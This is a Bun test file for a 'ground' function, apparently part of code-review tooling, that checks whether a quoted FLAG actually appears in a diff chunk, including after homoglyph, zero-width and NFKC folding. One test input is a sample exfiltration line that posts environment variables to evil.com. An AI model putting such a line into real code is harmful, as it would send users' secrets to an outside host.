import { describe, expect, test } from "bun:test";
import { ground } from "../../src/apply/ground.ts";

const chunk = `=== a.py (status: modified) ===\n+import os\n+requests.get("https://example.test/api", timeout=5)\n+x = "\\x63url"`;

describe("ground: is a FLAG quoting code that is in the chunk", () => {
  test("a quote that is in the chunk is GROUNDED, diff markers and whitespace folded", () => {
    expect(ground('FLAG\n1. FLAG: "requests.get(\\"https://example.test/api\\",  timeout=5)" calls out', chunk)).toBe("GROUNDED");
  });
  test("a quote spanning two diff lines matches once the + markers are stripped", () => {
    expect(ground('FLAG: "import os requests.get("', chunk)).toBe("GROUNDED");
  });
  test("a JSON-escaped newline in the quote reads as the code's line break", () => {
    expect(ground('FLAG: "import os\\n+requests.get(\\"https"', chunk)).toBe("GROUNDED");
  });
  test("a quote that is not in the chunk is UNGROUNDED", () => {
    expect(ground(`FLAG: "requests.post('http://evil.com/log', json=env_vars)"`, chunk)).toBe("UNGROUNDED");
  });
  test("no quote, or only quotes shorter than 8 characters, is NOQUOTE", () => {
    expect(ground("FLAG\nsuspicious refactor", chunk)).toBe("NOQUOTE");
    expect(ground('FLAG: "os"', chunk)).toBe("NOQUOTE");
  });
  test("quotes on lines without FLAG are ignored", () => {
    expect(ground('FLAG\nthe line "requests.get(" is fine', chunk)).toBe("NOQUOTE");
  });
  test("look-alike letters and zero-width characters fold before matching", () => {
    expect(ground('FLAG: "rеquеsts.get(\\"https://еxample.test/api\\""', chunk)).toBe("GROUNDED");
    expect(ground('FLAG: "requests​.get(\\"https://example.test"', chunk)).toBe("GROUNDED");
  });
  test("fullwidth forms fold (NFKC) on both sides", () => {
    expect(ground('FLAG: "eval(payload_x)"', "+\uff45\uff56\uff41\uff4c(payload_x)")).toBe("GROUNDED");
  });
  test("an elided quote matches on any long enough piece", () => {
    expect(ground('FLAG: "requests.get(... nowhere in the diff"', chunk)).toBe("GROUNDED");
  });
  test("an escaped backslash in the quote matches the code's literal backslash", () => {
    expect(ground('FLAG: "x = \\"\\\\x63url\\""', chunk)).toBe("GROUNDED");
  });
});
